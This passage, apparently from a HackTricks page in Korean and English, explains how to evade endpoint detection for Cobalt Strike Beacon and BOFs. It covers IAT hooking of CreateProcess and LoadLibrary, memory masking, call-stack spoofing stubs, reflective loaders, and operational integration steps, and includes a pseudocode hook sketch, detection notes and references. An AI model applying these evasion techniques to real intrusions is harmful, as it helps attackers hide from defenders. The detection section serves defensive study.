  - Call‑stack spoofing: 정상적인 스택을 구성하고 target API로 전환하여 call‑stack 분석이 예상된 프레임으로 해석되도록 함.
- 호환성을 위해 인터페이스를 export하여 Aggressor script(또는 동등한 도구)가 Beacon, BOFs 및 post‑ex DLLs에 대해 훅할 API를 등록할 수 있게 합니다.

Why IAT hooking here
- hooked import를 사용하는 모든 코드에 대해 동작하며, 툴 코드를 수정하거나 Beacon이 특정 API를 프록시하도록 의존할 필요가 없습니다.
- post‑ex DLLs를 포괄: LoadLibrary*를 훅하면 모듈 로드(예: System.Management.Automation.dll, clr.dll)를 가로채고 해당 API 호출에 동일한 마스킹/스택 회피를 적용할 수 있습니다.
- CreateProcessA/W를 래핑함으로써 call‑stack–based 탐지에 대응해 process‑spawning post‑ex 명령을 신뢰성 있게 사용할 수 있도록 복원합니다.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
참고
- 패치는 relocations/ASLR 이후 및 import의 최초 사용 이전에 적용하세요. Reflective loaders like TitanLdr/AceLdr는 로드된 모듈의 DllMain 동안 hooking을 수행함을 보여줍니다.
- 래퍼는 작고 PIC-safe하게 유지하세요; 실제 API는 패치 전에 캡처한 원래 IAT 값이나 LdrGetProcedureAddress를 통해 해결하세요.
- PIC에는 RW → RX 전환을 사용하고, writable+executable 페이지를 남기지 마세요.

Call‑stack spoofing stub
- Draugr‑style PIC stubs는 가짜 호출 체인(정상 모듈을 가리키는 리턴 주소들)을 구성한 다음 실제 API로 피벗합니다.
- 이는 Beacon/BOFs에서 민감한 API로 향하는 표준 스택을 예상하는 탐지를 무력화합니다.
- API prologue 이전에 예상 프레임 내로 진입하려면 stack cutting/stack stitching 기술과 결합하세요.

운영 통합
- reflective loader를 post‑ex DLLs 앞에 붙여 DLL이 로드될 때 PIC와 hooks가 자동으로 초기화되게 하세요.
- Aggressor script를 사용해 대상 APIs를 등록하면 Beacon과 BOFs가 코드 변경 없이 동일한 회피 경로를 투명하게 활용할 수 있습니다.

Detection/DFIR considerations
- IAT integrity: non‑image (heap/anon) 주소로 해석되는 엔트리; import 포인터의 주기적 검증.
- Stack anomalies: 로드된 이미지에 속하지 않는 리턴 주소; non‑image PIC로의 급작스런 전환; 일관성 없는 RtlUserThreadStart 호출 계보.
- Loader telemetry: 프로세스 내부의 IAT에 대한 쓰기, import thunks를 수정하는 초기 DllMain 활동, 로드 시 생성된 예상치 못한 RX 영역.
- Image‑load evasion: LoadLibrary*를 후킹하는 경우 memory masking 이벤트와 연관된 automation/clr 어셈블리의 의심스러운 로드를 모니터링하세요.

관련 빌딩 블록 및 예시
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## 참고문헌

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
